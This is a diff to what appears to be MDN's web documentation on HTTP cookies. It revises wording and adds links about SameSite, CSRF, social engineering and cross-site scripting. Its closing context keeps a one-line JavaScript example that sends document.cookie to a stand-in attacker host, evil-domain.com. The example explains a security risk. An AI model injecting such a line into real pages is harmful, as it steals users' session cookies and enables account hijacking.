@@ -97,7 +97,7 @@ tags:
 				<ul>
 					<li>The <code>lax</code> value will send the cookie for all same-site
 						requests and top-level navigation GET requests. This is sufficient
-						for user tracking, but it will prevent many CSRF attacks. This is
+            for user tracking, but it will prevent many <a href="/en-US/docs/Glossary/CSRF" >Cross-Site Request Forgery</a> (CSRF) attacks. This is
 						the default value in modern browsers.</li>
 					<li>The <code>strict</code> value will prevent the cookie from being
 						sent by the browser to the target site in all cross-site browsing
@@ -251,10 +251,10 @@ if (document.cookie.split(';').some((item) =&gt; item.includes('reader=1'))) {
 	using a different domain or subdomain, due to the <a
 		href="/en-US/docs/Web/Security/Same-origin_policy">same origin policy</a>.</p>
 
-<p>Cookies are often used in web application to identify a user and their authenticated
-	session. So stealing the cookie from a web application, will lead to hijacking the
-	authenticated user's session. Common ways to steal cookies include using Social
-	Engineering or by exploiting an XSS vulnerability in the application -</p>
+<p>Cookies are often used in web applications to identify a user and their authenticated
+	session. Stealing a cookie from a web application leads to hijacking the
+	authenticated user's session. Common ways to steal cookies include using <a href="https://en.wikipedia.org/wiki/Social_engineering_(security)">social
+  engineering</a> or by exploiting a <a href="/en-US/docs/Glossary/Cross-site_scripting">cross-site scripting</a> (XSS) vulnerability in the application -</p>
 
 <pre class="brush: js">(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 </pre>
